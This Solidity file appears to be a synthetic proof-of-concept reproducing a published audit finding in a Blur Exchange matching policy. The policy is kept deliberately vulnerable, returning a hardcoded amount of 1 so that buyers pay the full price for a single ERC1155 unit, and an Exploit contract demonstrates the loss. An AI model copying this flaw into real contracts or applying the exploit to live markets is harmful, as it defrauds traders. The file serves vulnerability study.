// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Blur Exchange — StandardPolicyERC1155 returns amount == 1 instead of order.amount
    (Code4rena 2022-10-blur, finding #42876, H-01)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: canMatchMakerAsk hardcodes `1` as the matched amount. BlurExchange
    then transfers only 1 ERC1155 unit while settling the full order.price.
    Buyer overpays; seller under-delivers. Vulnerable return of `1` preserved
    verbatim (@> VULN). */

enum Side { Buy, Sell }
enum AssetType { ERC721, ERC1155 }

struct Order {
    Side side;
    address trader; // order signer (seller or buyer)
    address paymentToken;
    address collection;
    uint256 tokenId;
    address matchingPolicy;
    uint256 price;
    uint256 amount;
}

/// @dev Minimal ERC20 payment token (WETH stand-in).
contract MockToken {
    string public name = "WETH";
    string public symbol = "WETH";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal ERC1155 (operator approvals omitted — exchange is trusted).
contract MockERC1155 {
    mapping(address => mapping(uint256 => uint256)) public balanceOf;

    function mint(address to, uint256 id, uint256 amt) external {
        balanceOf[to][id] += amt;
    }

    function safeTransferFrom(address from, address to, uint256 id, uint256 amt, bytes calldata) external {
        require(balanceOf[from][id] >= amt, "1155 bal");
        balanceOf[from][id] -= amt;
        balanceOf[to][id] += amt;
    }
}

/// @notice Faithful reduction of StandardPolicyERC1155.canMatchMakerAsk
///         (code-423n4/2022-10-blur contracts/matchingPolicies/StandardPolicyERC1155.sol#L12-L36)
contract StandardPolicyERC1155 {
    function canMatchMakerAsk(Order calldata makerAsk, Order calldata takerBid)
        external
        pure
        returns (bool, uint256, uint256, uint256, AssetType)
    {
        return (
            (makerAsk.side != takerBid.side) &&
            (makerAsk.paymentToken == takerBid.paymentToken) &&
            (makerAsk.collection == takerBid.collection) &&
            (makerAsk.tokenId == takerBid.tokenId) &&
            (makerAsk.matchingPolicy == takerBid.matchingPolicy) &&
            (makerAsk.price == takerBid.price),
            makerAsk.price,
            makerAsk.tokenId,
            1, // @> VULN: hardcoded amount 1 instead of makerAsk.amount / order.amount
            // FIX: return makerAsk.amount (and enforce takerBid.amount match)
            AssetType.ERC1155
        );
    }
}

/// @notice Reduced BlurExchange.execute: match via policy, transfer payment for
///         full price, transfer ERC1155 for policy-returned amount only.
contract BlurExchange {
    StandardPolicyERC1155 public immutable policy;

    constructor(StandardPolicyERC1155 policy_) {
        policy = policy_;
    }

    function execute(Order calldata sell, Order calldata buy) external {
        require(sell.side == Side.Sell && buy.side == Side.Buy, "sides");
        (bool ok, uint256 price, uint256 tokenId, uint256 amount, AssetType atype) =
            policy.canMatchMakerAsk(sell, buy);
        require(ok, "no match");
        require(atype == AssetType.ERC1155, "1155");

        // Buyer pays the FULL order price to the seller (order.trader on sell side).
        MockToken(sell.paymentToken).transferFrom(buy.trader, sell.trader, price);

        // Exchange transfers only `amount` ERC1155 units (policy returned 1).
        MockERC1155(sell.collection).safeTransferFrom(sell.trader, buy.trader, tokenId, amount, "");
    }
}

contract Exploit {
    MockToken public weth; // CREATE nonce 1
    MockERC1155 public nft; // CREATE nonce 2
    StandardPolicyERC1155 public policy; // CREATE nonce 3 — vulnerable policy
    BlurExchange public exchange; // CREATE nonce 4
    address public seller; // CREATE nonce 5

    uint256 public constant TOKEN_ID = 7;
    uint256 public constant ORDER_AMOUNT = 10;
    uint256 public constant PRICE = 100 ether;

    constructor() {
        weth = new MockToken();
        nft = new MockERC1155();
        policy = new StandardPolicyERC1155();
        exchange = new BlurExchange(policy);
        seller = address(new SellerWallet());

        // Seller holds 10 ERC1155 of TOKEN_ID.
        nft.mint(seller, TOKEN_ID, ORDER_AMOUNT);
        // Buyer (this / buy.trader) gets WETH to pay the full price.
        weth.mint(address(this), PRICE);
    }

    function run() external {
        Order memory sell = Order({
            side: Side.Sell,
            trader: seller,
            paymentToken: address(weth),
            collection: address(nft),
            tokenId: TOKEN_ID,
            matchingPolicy: address(policy),
            price: PRICE,
            amount: ORDER_AMOUNT
        });
        Order memory buy = Order({
            side: Side.Buy,
            trader: address(this),
            paymentToken: address(weth),
            collection: address(nft),
            tokenId: TOKEN_ID,
            matchingPolicy: address(policy),
            price: PRICE,
            amount: ORDER_AMOUNT
        });

        weth.approve(address(exchange), PRICE);

        uint256 buyerNftsBefore = nft.balanceOf(address(this), TOKEN_ID);
        uint256 sellerWethBefore = weth.balanceOf(seller);

        exchange.execute(sell, buy);

        uint256 buyerNftsAfter = nft.balanceOf(address(this), TOKEN_ID);
        uint256 sellerWethAfter = weth.balanceOf(seller);
        uint256 sellerNftsLeft = nft.balanceOf(seller, TOKEN_ID);

        // HARM: buyer paid full PRICE for ORDER_AMOUNT but only received 1 unit.
        require(sellerWethAfter - sellerWethBefore == PRICE, "seller should receive full price");
        require(buyerNftsAfter - buyerNftsBefore == 1, "buyer only got 1 ERC1155");
        require(sellerNftsLeft == ORDER_AMOUNT - 1, "seller kept 9 of 10");
        require(weth.balanceOf(address(this)) == 0, "buyer spent full price");
    }
}

contract SellerWallet {
    // holds ERC1155 inventory
}
